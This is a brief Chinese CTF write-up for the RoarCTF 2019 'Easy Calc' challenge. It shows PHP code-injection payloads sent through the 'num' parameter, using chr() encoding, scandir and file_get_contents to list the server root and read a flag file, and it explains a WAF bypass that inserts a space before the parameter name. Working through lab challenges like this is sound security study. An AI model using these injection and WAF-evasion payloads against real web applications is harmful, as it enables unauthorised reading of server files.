九、

  • 题目：[RoarCTF 2019]Easy Calc
    打开靶场，一个简单的计算器，在源代码中发现一些东西

    WAF和calc.php,访问calca.php
  • 分析
    本来以为是个简单的命令执行，但是我错了，输入num的值，发现不能输入字母，只能是数字或者运算符，才会有回显，WAF
    看了别人的wp说num前加括号可以绕过
    然后输入 num=system(chr(39).ls.chr(39))什么也没有，看了下 num=phpinfo()发现system和其他一些函数被禁了,使用scandir,过滤的字符可以用chr编码
  • 解
    num=var_dump(scandir(chr(47)))

    打开f1agg：? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))得到flag
  • 知识点
  • *几个函数：**

    scandir — 列出指定路径中的文件和目录,返回一个数组
    file_get_contents — 将整个文件读入一个字符串
    var_dump — 打印变量的相关信息

WAF

Web Application Firewall
Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。

PHP的字符串解析特性

PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。
在本题中利用空格，变量num变成了空格num，WAF找不到num这个变量，也就不起作用了，而变量进入到PHP语句中，空格会被删除
